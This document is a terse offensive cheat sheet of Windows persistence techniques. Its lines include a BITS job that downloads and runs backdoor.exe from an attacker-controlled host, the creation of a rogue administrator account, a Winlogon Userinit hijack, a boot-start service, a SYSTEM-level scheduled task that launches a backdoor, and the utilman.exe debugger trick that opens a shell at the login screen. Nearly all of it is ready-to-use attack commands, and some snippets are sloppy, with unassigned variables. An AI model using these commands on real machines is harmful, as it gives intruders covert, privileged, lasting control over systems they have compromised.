# ### Persistence from on low ###

# Startup folder persistence
C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

# Edit the registry
# Startup from registry editing
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

	

# BITS Jobs
# Note: In order to work you have to have a webserver running so BITS can download the backdoor and Metasploit listening for connections.
# ALSO Note: BITS is very unstable and can and might give you just temporary persistence.
bitsadmin /addfile backdoor "http://attackbox:port/backdoor.exe" "C:\Users\%username%\somewhere\backdoor.exe"
bitsadmin /SetNotifyCmdline 1 cmd.exe "/c bitsadmin.exe /complete backdoor | start /B C:\path\backdoor.exe"
bitsadmin /SetMinRetryDelay backdoor 30
bitsadmin /resume

# Persistence 
Persistence from on high
## Creating another administrator user
```powershell
net user /add <user> <password>
net localgroup Administrators backdoor /add
```
## Edit the registry
User logon that sends you a shell:
```powershell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, <PATH_TO_BINARY>" /f 
```

## Persistence by creating a service
```powershell
New-Service -Name "<SERVICE_NAME>" -BinaryPathName "<PATH_TO_BINARY>" -Description "<SERVICE_DESCRIPTION>" -StartupType "Boot"
```
## Scheduled tasks
```powershell
New-ScheduledTaskAction -Execute "cmd.exe" -ARgument "/ C:\path\backdoor.exe"
New-ScheduledTaskTrigger -AtlogOn
New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest
New-ScheduledTaskSettingsSet
Register-ScheduledTask -Action $A -Trigger $B -Principal $C -Settings $D
Register-ScheduledTask Backdoor -InputObject $E
```
## Backdooring RDP
```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f	
```